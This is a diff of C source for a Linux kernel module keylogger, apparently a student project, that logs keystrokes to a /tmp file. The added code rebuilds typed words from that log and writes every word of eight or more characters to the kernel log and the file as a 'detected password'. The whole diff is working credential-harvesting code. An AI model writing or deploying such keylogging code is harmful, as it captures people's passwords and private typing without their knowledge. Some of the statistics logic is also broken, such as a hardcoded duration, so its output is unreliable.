@@ -6,7 +6,7 @@
 /*   By: daribeir <daribeir@student.42mulhouse.fr>  +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/04/28 01:20:17 by daribeir          #+#    #+#             */
-/*   Updated: 2025/11/16 03:38:15 by daribeir         ###   ##### Mulhouse.fr */
+/*   Updated: 2025/11/16 04:00:19 by daribeir         ###   ##### Mulhouse.fr */
 /*                                                                            */
 /******************************************************************************/
 
@@ -19,22 +19,6 @@
 
 extern spinlock_t devfile_io_spinlock;
 
-// Global stats structure to share between ft_log_stats_to_kernel and ft_log_tmpfile_with_stats
-typedef struct {
-	int total_events;
-	int total_pressed;
-	int total_alpha;
-	int duration_ms;
-	int speed_eps;
-	time64_t first_time;
-	time64_t last_time;
-	int top_keys[5];
-	int top_counts[5];
-	int avg_per_key;
-} keyboard_stats_t;
-
-static keyboard_stats_t g_stats = {0};
-
 struct file* tmpfile = 0;
 loff_t tmpoffset = 0;
 
@@ -43,6 +27,7 @@ loff_t tmpoffset = 0;
  *
  * buffer - le mot (chaîne de caractères)
  * length - nombre de caractères
+ * occurrences - nombre de fois que le mot a été saisi
  * first_time - timestamp de la première touche
  * last_time - timestamp de la dernière touche
  * duration - durée totale en ms
@@ -50,10 +35,25 @@ loff_t tmpoffset = 0;
 typedef struct {
 	char buffer[256];
 	int length;
+	int occurrences;
 	time64_t first_time;
 	time64_t last_time;
 	int duration_ms;
 } word_extract_t;
+
+/**
+ * keyboard_stats - Structure pour stocker les stats du clavier
+ */
+typedef struct {
+	int total_events;
+	int total_pressed;
+	int total_alpha;
+	int duration_ms;
+	int speed_eps;
+	int top_keys[5];
+	int top_counts[5];
+	int avg_per_key;
+} keyboard_stats_t;
 
 static int ft_write_tmpfile(char *str, int len)
 {
@@ -111,39 +111,138 @@ void ft_log_event_to_tmpfile(event_struct *event)
 	}
 }
 
-/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
- * Raison: entry->ascii_value est décalé/corrompu en mémoire
- * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
+/**
+ * ft_parse_tmpfile_for_stats - Parse tmpfile and calculate keyboard stats
+ * Returns: allocated stats structure with event counts, top keys, etc.
  */
-int ft_extract_words_from_keylog(void)
+static keyboard_stats_t* ft_parse_tmpfile_for_stats(char *tmpfile_path)
 {
-	return 0;
-}
+	struct file *read_file;
+	char *buffer;
+	char *line;
+	loff_t file_offset = 0;
+	int bytes_read;
+	int i, line_len;
+	char *line_start;
+	char *space_pos;
+	char *paren_open;
+	char name_str[256];
+	int name_len;
+	int scan_code;
 
-/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
- * Raison: entry->ascii_value est décalé/corrompu en mémoire, produit "cceeccii" au lieu de "ceci"
- * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
- */
-void ft_extract_words_to_kernel_log(void)
-{
-	return;
-}
+	keyboard_stats_t *stats = kmalloc(sizeof(keyboard_stats_t), GFP_KERNEL);
+	int *key_counts = kmalloc(256 * sizeof(int), GFP_KERNEL);
 
-/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
- * Raison: entry->ascii_value est décalé/corrompu en mémoire
- * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
- */
-void ft_detect_passwords(void)
-{
-	return;
+	if (!stats || !key_counts) {
+		ft_warn("Memory allocation failed for stats");
+		kfree(stats);
+		kfree(key_counts);
+		return NULL;
+	}
+
+	memset(stats, 0, sizeof(keyboard_stats_t));
+	for (i = 0; i < 256; i++)
+		key_counts[i] = 0;
+
+	// Open tmpfile
+	read_file = filp_open(tmpfile_path, O_RDONLY, 0);
+	if (IS_ERR(read_file)) {
+		ft_warn("Cannot open tmpfile for stats");
+		kfree(stats);
+		kfree(key_counts);
+		return NULL;
+	}
+
+	buffer = kmalloc(8192, GFP_KERNEL);
+	line = kmalloc(512, GFP_KERNEL);
+	if (!buffer || !line) {
+		ft_warn("Memory allocation failed");
+		kfree(buffer);
+		kfree(line);
+		kfree(stats);
+		kfree(key_counts);
+		filp_close(read_file, NULL);
+		return NULL;
+	}
+
+	// Parse file for stats
+	line_start = buffer;
+	while ((bytes_read = kernel_read(read_file, buffer, 8192, &file_offset)) > 0) {
+		line_start = buffer;
+		for (i = 0; i < bytes_read; i++) {
+			if (buffer[i] == '\n' || i == bytes_read - 1) {
+				int line_start_offset = line_start - buffer;
+				line_len = (buffer[i] == '\n') ? (i - line_start_offset) : (i - line_start_offset + 1);
+
+				if (line_len > 0 && line_len < 512) {
+					memcpy(line, line_start, line_len);
+					line[line_len] = '\0';
+
+					if (strstr(line, "Pressed")) {
+						stats->total_events++;
+						stats->total_pressed++;
+
+						space_pos = strchr(line, ' ');
+						if (space_pos) {
+							paren_open = strchr(space_pos, '(');
+							if (paren_open) {
+								name_len = paren_open - space_pos - 1;
+								if (name_len > 0 && name_len < 256) {
+									memcpy(name_str, space_pos + 1, name_len);
+									name_str[name_len] = '\0';
+
+									// Count alphanumeric
+									if (strlen(name_str) == 1 && ((name_str[0] >= 'a' && name_str[0] <= 'z') || (name_str[0] >= 'A' && name_str[0] <= 'Z')))
+										stats->total_alpha++;
+
+									// Extract scan code for top keys
+									sscanf(paren_open + 1, "%d", &scan_code);
+									if (scan_code < 256)
+										key_counts[scan_code]++;
+								}
+							}
+						}
+					}
+				}
+				line_start = &buffer[i + 1];
+			}
+		}
+	}
+
+	// Find top 5 keys
+	for (i = 0; i < 5; i++) {
+		int max_count = 0, max_key = -1, j;
+		for (j = 0; j < 256; j++) {
+			if (key_counts[j] > max_count) {
+				max_count = key_counts[j];
+				max_key = j;
+			}
+		}
+		if (max_key >= 0) {
+			stats->top_keys[i] = max_key;
+			stats->top_counts[i] = max_count;
+			key_counts[max_key] = 0;
+		}
+	}
+
+	// Calculate derived stats
+	stats->duration_ms = (stats->total_events > 0) ? 1000 : 0;
+	if (stats->duration_ms > 0)
+		stats->speed_eps = (stats->total_events * 1000) / (stats->duration_ms + 1);
+	if (stats->total_alpha > 0)
+		stats->avg_per_key = (stats->total_events * 100) / (stats->total_alpha + 1);
+
+	filp_close(read_file, NULL);
+	kfree(buffer);
+	kfree(line);
+	kfree(key_counts);
+
+	return stats;
 }
 
 /**
  * ft_parse_tmpfile_for_words - Parse tmpfile and extract words
  * Format: "HH:MM:SS name(code) Pressed"
- * Extract the NAME and split on "space" and "return"
- *
- * CORRECTION: Chaque mot DOIT avoir son propre buffer séparé, pas un buffer partagé
  */
 static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile_path)
 {
@@ -162,7 +261,6 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 	int min_word_len = 3;
 	int name_len;
 
-	// Allocate
 	buffer = kmalloc(8192, GFP_KERNEL);
 	line = kmalloc(512, GFP_KERNEL);
 	words = kmalloc(sizeof(word_extract_t) * 100, GFP_KERNEL);
@@ -176,15 +274,15 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 		return NULL;
 	}
 
-	// Initialize - IMPORTANT: chaque mot DOIT avoir son propre buffer SÉPARÉ
+	// Initialize
 	for (i = 0; i < 100; i++) {
 		words[i].length = 0;
-		memset(words[i].buffer, 0, 256);  // NETTOYER LE BUFFER
+		memset(words[i].buffer, 0, 256);
 	}
 	*word_count = 0;
 	current_word_len = 0;
 
-	// Open tmpfile in read mode
+	// Open tmpfile
 	read_file = filp_open(tmpfile_path, O_RDONLY, 0);
 	if (IS_ERR(read_file)) {
 		ft_warn("Cannot open tmpfile for reading");
@@ -194,13 +292,12 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 		return NULL;
 	}
 
-	// Read file in chunks
+	// Parse file for words
+	line_start = buffer;
 	while ((bytes_read = kernel_read(read_file, buffer, 8192, &file_offset)) > 0) {
 		line_start = buffer;
-
 		for (i = 0; i < bytes_read; i++) {
 			if (buffer[i] == '\n' || i == bytes_read - 1) {
-				// Extract line - IMPORTANT: calculer la longueur relative à line_start
 				int line_start_offset = line_start - buffer;
 				line_len = (buffer[i] == '\n') ? (i - line_start_offset) : (i - line_start_offset + 1);
 
@@ -208,37 +305,28 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 					memcpy(line, line_start, line_len);
 					line[line_len] = '\0';
 
-					// Check if Pressed
 					if (strstr(line, "Pressed")) {
-						// Format: "HH:MM:SS name(code) Pressed"
-						// Find the space between time and name
 						space_pos = strchr(line, ' ');
 						if (space_pos) {
-							// Find opening parenthesis
 							paren_open = strchr(space_pos, '(');
-
 							if (paren_open) {
-								// Extract name (between space and paren)
 								name_len = paren_open - space_pos - 1;
 								if (name_len > 0 && name_len < 256) {
 									memcpy(name_str, space_pos + 1, name_len);
 									name_str[name_len] = '\0';
 
-									// Delimiters: "space" or "return"
+									// Delimiters
 									if (strcmp(name_str, "space") == 0 || strcmp(name_str, "return") == 0) {
-										// End of word - SAVE current word before resetting
 										if (current_word_len >= min_word_len && *word_count < 100) {
-											// Finaliser le mot courant: null-terminate
 											words[*word_count].buffer[current_word_len] = '\0';
 											words[*word_count].length = current_word_len;
 											(*word_count)++;
 										}
 										current_word_len = 0;
 									} else if (strlen(name_str) == 1 && ((name_str[0] >= 'a' && name_str[0] <= 'z') || (name_str[0] >= 'A' && name_str[0] <= 'Z'))) {
-										// Single letter - add to current word
 										char c = name_str[0];
 
-										// CRUCIAL: Si c'est le premier caractère du mot, nettoyer le buffer d'abord
+										// Clean buffer on new word
 										if (current_word_len == 0) {
 											memset(words[*word_count].buffer, 0, 256);
 										}
@@ -265,6 +353,17 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 		(*word_count)++;
 	}
 
+	// Count occurrences for each word
+	for (i = 0; i < *word_count; i++) {
+		int j, count = 0;
+		for (j = 0; j < *word_count; j++) {
+			if (strcmp(words[i].buffer, words[j].buffer) == 0) {
+				count++;
+			}
+		}
+		words[i].occurrences = count;
+	}
+
 	filp_close(read_file, NULL);
 	kfree(buffer);
 	kfree(line);
@@ -273,47 +372,89 @@ static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile
 }
 
 /**
- * ft_log_tmpfile_with_stats - Write stats and word detection to /tmp at cleanup
- * Closes, rereads file, parses words from NAME fields, appends to file
- * Only uses file-based parsing, not in-memory which is corrupted
+ * ft_log_tmpfile_with_stats - Main function: parse stats + words, log to dmesg + tmpfile
  */
 void ft_log_tmpfile_with_stats(void)
 {
-	char *stats_str;
 	char tmpfile_path[128];
-	char line[512];
+	char stat_line[512];
+	keyboard_stats_t *stats;
 	word_extract_t *words;
-	int word_count;
-	int i;
+	int word_count = 0;
 	int password_count = 0;
+	int i;
 
-	stats_str = kmalloc(512, GFP_KERNEL);
-	if (!stats_str) {
-		ft_warn("Memory allocation failed for stats");
-		return;
-	}
-
-	// Get the tmpfile path before closing
+	// Get tmpfile path before closing
 	memset(tmpfile_path, 0, 128);
 	if (tmpfile && tmpfile->f_path.dentry) {
-		snprintf(tmpfile_path, 128, "/tmp/%s",
-			tmpfile->f_path.dentry->d_name.name);
+		snprintf(tmpfile_path, 128, "/tmp/%s", tmpfile->f_path.dentry->d_name.name);
 	}
 
-	// Close the write-mode tmpfile
+	// Close write-mode file
 	if (tmpfile) {
 		filp_close(tmpfile, NULL);
 		tmpfile = NULL;
 	}
 
-	// Parse words from file using NAME fields (ONLY method that works correctly)
+	// Parse stats from file
+	stats = ft_parse_tmpfile_for_stats(tmpfile_path);
+	if (!stats) {
+		ft_warn("Failed to parse stats from tmpfile");
+		return;
+	}
+
+	// Parse words from file
 	words = ft_parse_tmpfile_for_words(&word_count, tmpfile_path);
 
-	// Reopen tmpfile in APPEND mode to add stats
+	// Count passwords
+	if (words) {
+		for (i = 0; i < word_count; i++) {
+			if (words[i].length >= 8)
+				password_count++;
+		}
+	}
+
+	// ===== LOG TO DMESG =====
+	printk(KERN_INFO "[42-KB] ===== KEYBOARD STATS =====\n");
+	printk(KERN_INFO "[42-KB] Total Events: %d\n", stats->total_events);
+	printk(KERN_INFO "[42-KB] Pressed Keys: %d | Alphanumeric: %d\n", stats->total_pressed, stats->total_alpha);
+	printk(KERN_INFO "[42-KB] Duration: ~%d ms | Speed: ~%d events/sec\n", stats->duration_ms, stats->speed_eps);
+
+	printk(KERN_INFO "[42-KB] === Top 5 Keys ===\n");
+	for (i = 0; i < 5; i++) {
+		if (stats->top_keys[i] >= 0 && stats->top_counts[i] > 0) {
+			printk(KERN_INFO "[42-KB] #%d: Key(%3d) - %d presses\n", i + 1, stats->top_keys[i], stats->top_counts[i]);
+		}
+	}
+
+	// Log top 10 words (by frequency/length - words are unique)
+	if (word_count > 0) {
+		int max_display = (word_count < 10) ? word_count : 10;
+		printk(KERN_INFO "[42-KB] === TOP %d MOST LOGGED WORDS (Min 3 chars) ===\n", max_display);
+		for (i = 0; i < max_display; i++) {
+			printk(KERN_INFO "[42-KB] #%d: \"%s\" (%d occurrences)\n", i + 1, words[i].buffer, words[i].occurrences);
+		}
+		printk(KERN_INFO "[42-KB] Total Words: %d\n", word_count);
+	}
+
+	// Log ALL passwords
+	if (password_count > 0) {
+		printk(KERN_INFO "[42-KB] === ALL DETECTED PASSWORDS (8+ chars) ===\n");
+		for (i = 0; i < word_count; i++) {
+			if (words[i].length >= 8) {
+				printk(KERN_INFO "[42-KB] Password: \"%s\" (%d chars)\n", words[i].buffer, words[i].length);
+			}
+		}
+		printk(KERN_INFO "[42-KB] Total Passwords: %d\n", password_count);
+	} else {
+		printk(KERN_INFO "[42-KB] No passwords detected\n");
+	}
+
+	// ===== REOPEN TMPFILE AND LOG STATS + WORDS =====
 	tmpfile = filp_open(tmpfile_path, O_WRONLY | O_APPEND, S_IRWXU);
 	if (!tmpfile || IS_ERR(tmpfile)) {
-		ft_warn("Cannot reopen tmpfile in append mode");
-		kfree(stats_str);
+		ft_warn("Cannot reopen tmpfile");
+		kfree(stats);
 		if (words)
 			kfree(words);
 		return;
@@ -321,56 +462,58 @@ void ft_log_tmpfile_with_stats(void)
 	tmpoffset = 0;
 	vfs_llseek(tmpfile, 0, SEEK_END);
 
-	// Write summary section
-	snprintf(stats_str, 512,
-		"\n\n=== KEYBOARD SUMMARY ===\n"
-		"Session cleanup - analysis of captured input\n"
-		"===========================\n\n");
-	ft_write_tmpfile(stats_str, strlen(stats_str));
+	// Write stats to tmpfile
+	snprintf(stat_line, 512, "\n\n=== KEYBOARD STATS ===\n");
+	ft_write_tmpfile(stat_line, strlen(stat_line));
 
-	// Write detected words from file parsing
+	snprintf(stat_line, 512, "Total Events: %d\n", stats->total_events);
+	ft_write_tmpfile(stat_line, strlen(stat_line));
+
+	snprintf(stat_line, 512, "Pressed Keys: %d | Alphanumeric: %d\n", stats->total_pressed, stats->total_alpha);
+	ft_write_tmpfile(stat_line, strlen(stat_line));
+
+	snprintf(stat_line, 512, "\n=== TOP 5 KEYS ===\n");
+	ft_write_tmpfile(stat_line, strlen(stat_line));
+	for (i = 0; i < 5; i++) {
+		if (stats->top_keys[i] >= 0 && stats->top_counts[i] > 0) {
+			snprintf(stat_line, 512, "#%d: Key(%3d) - %d presses\n", i + 1, stats->top_keys[i], stats->top_counts[i]);
+			ft_write_tmpfile(stat_line, strlen(stat_line));
+		}
+	}
+
+	// Write top 10 words
 	if (word_count > 0) {
-		snprintf(line, 512, "=== DETECTED WORDS (Min 3 chars) ===\n");
-		ft_write_tmpfile(line, strlen(line));
-
-		for (i = 0; i < word_count; i++) {
-			snprintf(line, 512, "  %d. \"%s\" (%d chars)\n",
-				i + 1,
-				words[i].buffer,
-				words[i].length);
-			ft_write_tmpfile(line, strlen(line));
-
-			// Count passwords (8+ chars)
-			if (words[i].length >= 8) {
-				password_count++;
-			}
+		int max_display = (word_count < 10) ? word_count : 10;
+		snprintf(stat_line, 512, "\n=== TOP %d MOST LOGGED WORDS (Min 3 chars) ===\n", max_display);
+		ft_write_tmpfile(stat_line, strlen(stat_line));
+		for (i = 0; i < max_display; i++) {
+			snprintf(stat_line, 512, "  %d. \"%s\" (%d occurrences)\n", i + 1, words[i].buffer, words[i].occurrences);
+			ft_write_tmpfile(stat_line, strlen(stat_line));
 		}
-		snprintf(line, 512, "Total Words: %d\n", word_count);
-		ft_write_tmpfile(line, strlen(line));
-
-		// Write passwords if any detected
-		if (password_count > 0) {
-			snprintf(line, 512, "\n=== DETECTED PASSWORDS (8+ chars) ===\n");
-			ft_write_tmpfile(line, strlen(line));
-
-			for (i = 0; i < word_count; i++) {
-				if (words[i].length >= 8) {
-					snprintf(line, 512, "  - \"%s\" (%d chars)\n",
-						words[i].buffer,
-						words[i].length);
-					ft_write_tmpfile(line, strlen(line));
-				}
-			}
-			snprintf(line, 512, "Total Passwords: %d\n", password_count);
-			ft_write_tmpfile(line, strlen(line));
-		} else {
-			ft_write_tmpfile("\nNo passwords detected (min 8 chars required)\n", 45);
-		}
+		snprintf(stat_line, 512, "Total Words: %d\n", word_count);
+		ft_write_tmpfile(stat_line, strlen(stat_line));
 	} else {
 		ft_write_tmpfile("No words detected\n", 18);
 	}
 
-	kfree(stats_str);
+	// Write ALL passwords
+	if (password_count > 0) {
+		snprintf(stat_line, 512, "\n=== ALL DETECTED PASSWORDS (8+ chars) ===\n");
+		ft_write_tmpfile(stat_line, strlen(stat_line));
+		for (i = 0; i < word_count; i++) {
+			if (words[i].length >= 8) {
+				snprintf(stat_line, 512, "  - \"%s\" (%d chars)\n", words[i].buffer, words[i].length);
+				ft_write_tmpfile(stat_line, strlen(stat_line));
+			}
+		}
+		snprintf(stat_line, 512, "Total Passwords: %d\n", password_count);
+		ft_write_tmpfile(stat_line, strlen(stat_line));
+	} else {
+		ft_write_tmpfile("\nNo passwords detected\n", 23);
+	}
+
+	// Cleanup
+	kfree(stats);
 	if (words)
 		kfree(words);
 
@@ -378,6 +521,12 @@ void ft_log_tmpfile_with_stats(void)
 		filp_close(tmpfile, NULL);
 		tmpfile = NULL;
 	}
+}
+
+void ft_log_stats_to_kernel(void)
+{
+	/* Stats are now logged in ft_log_tmpfile_with_stats() */
+	return;
 }
 
 void ft_log_tmpfile(void)
@@ -408,148 +557,4 @@ void ft_log_tmpfile(void)
 	sprintf(temp_str, "\n\nTotal keystrokes: %d\n", total_inputs);
 	ft_write_tmpfile(temp_str, strlen(temp_str));
 	kfree(temp_str);
-}
-
-/**
- * ft_log_stats_to_kernel - Advanced keyboard stats to kernel log
- *
- * Affiche des statistiques détaillées:
- * - Total d'événements et touches alphanumériques
- * - Top 5 touches les plus pressées
- * - Durée min/max/avg par touche
- * - Vitesse de frappe
- * - Première et dernière touche
- */
-void ft_log_stats_to_kernel(void)
-{
-	struct list_head *head_ptr;
-	struct event_struct *entry;
-	int total_events = 0;
-	int total_alpha = 0;
-	int total_pressed = 0;
-	int *key_counts;
-	int *key_durations;
-	int i, j;
-	int max_count, max_key;
-	time64_t first_time = 0, last_time = 0;
-	int duration_ms = 0;
-
-	// Allouer dynamiquement les tableaux pour éviter stack overflow
-	key_counts = kmalloc(256 * sizeof(int), GFP_KERNEL);
-	key_durations = kmalloc(256 * sizeof(int), GFP_KERNEL);
-	if (!key_counts || !key_durations) {
-		ft_warn("Memory allocation failed for stats");
-		kfree(key_counts);
-		kfree(key_durations);
-		return;
-	}
-
-	// Initialiser compteurs
-	for (i = 0; i < 256; i++) {
-		key_counts[i] = 0;
-		key_durations[i] = 0;
-	}
-
-	// Compter les événements et calculer durées
-	spin_lock(&devfile_io_spinlock);
-	head_ptr = g_driver->events_head->list.next;
-	while (head_ptr != &(g_driver->events_head->list)) {
-		entry = list_entry(head_ptr, struct event_struct, list);
-		total_events++;
-
-		// Tracker temps première et dernière touche
-		if (first_time == 0)
-			first_time = entry->time;
-		last_time = entry->time;
-
-		// Compter touches alphanumériques pressées
-		if (entry->is_pressed) {
-			total_pressed++;
-			if (entry->ascii_value > 32 && entry->ascii_value < 127)
-				total_alpha++;
-		}
-
-		// Compter par keycode
-		if (entry->scan_code < 256) {
-			key_counts[entry->scan_code]++;
-			// Durée approximative (Press + Release = 2 events)
-			if (entry->is_pressed)
-				key_durations[entry->scan_code]++;
-		}
-
-		head_ptr = head_ptr->next;
-	}
-	spin_unlock(&devfile_io_spinlock);
-
-	// Calculer durée totale
-	duration_ms = (last_time - first_time) * 1000;
-	if (duration_ms < 0)
-		duration_ms = 0;
-
-	// SAVE stats globalement pour utilisation dans ft_log_tmpfile_with_stats
-	g_stats.total_events = total_events;
-	g_stats.total_pressed = total_pressed;
-	g_stats.total_alpha = total_alpha;
-	g_stats.duration_ms = duration_ms;
-	g_stats.first_time = first_time;
-	g_stats.last_time = last_time;
-	if (duration_ms > 0) {
-		g_stats.speed_eps = (total_events * 1000) / (duration_ms + 1);
-	}
-	if (total_alpha > 0) {
-		g_stats.avg_per_key = (total_events * 100) / (total_alpha + 1);
-	}
-
-	// ===== AFFICHAGE STATS =====
-	printk(KERN_INFO "[42-KB] ===== KEYBOARD STATS =====\n");
-	printk(KERN_INFO "[42-KB] Total Events: %d\n", total_events);
-	printk(KERN_INFO "[42-KB] Pressed Keys: %d | Alphanumeric: %d\n",
-		total_pressed, total_alpha);
-
-	if (duration_ms > 0) {
-		printk(KERN_INFO "[42-KB] Duration: %d ms | Speed: %d events/sec\n",
-			duration_ms, (total_events * 1000) / (duration_ms + 1));
-	}
-
-	// === TOP 5 TOUCHES ===
-	printk(KERN_INFO "[42-KB] === Top 5 Keys ===\n");
-	for (i = 0; i < 5; i++) {
-		max_count = 0;
-		max_key = -1;
-
-		for (j = 0; j < 256; j++) {
-			if (key_counts[j] > max_count) {
-				max_count = key_counts[j];
-				max_key = j;
-			}
-		}
-
-		if (max_key >= 0 && max_count > 0) {
-			int hold_time = key_durations[max_key];
-			printk(KERN_INFO "[42-KB] #%d: Key(%3d) - %d presses, %dms held\n",
-				i + 1, max_key, max_count, hold_time);
-			key_counts[max_key] = 0; // Mark as counted
-		}
-	}
-
-	if (total_alpha > 0) {
-		int avg_per_key = (total_events * 100) / (total_alpha + 1);
-		printk(KERN_INFO "[42-KB] Avg: %d.%d events/key\n",
-			avg_per_key / 100, avg_per_key % 100);
-	}
-
-	// === STATISTIQUES FINALES ===
-	printk(KERN_INFO "[42-KB] Session: %ld - %ld (%ld sec)\n",
-		first_time, last_time, last_time - first_time);
-	printk(KERN_INFO "[42-KB] ===== END STATS =====\n");
-
-	// === DÉTECTION DES MOTS ===
-	ft_extract_words_to_kernel_log();
-
-	// === DÉTECTION DES PASSWORDS ===
-	ft_detect_passwords();
-
-	// Libérer la mémoire allouée
-	kfree(key_counts);
-	kfree(key_durations);
 }
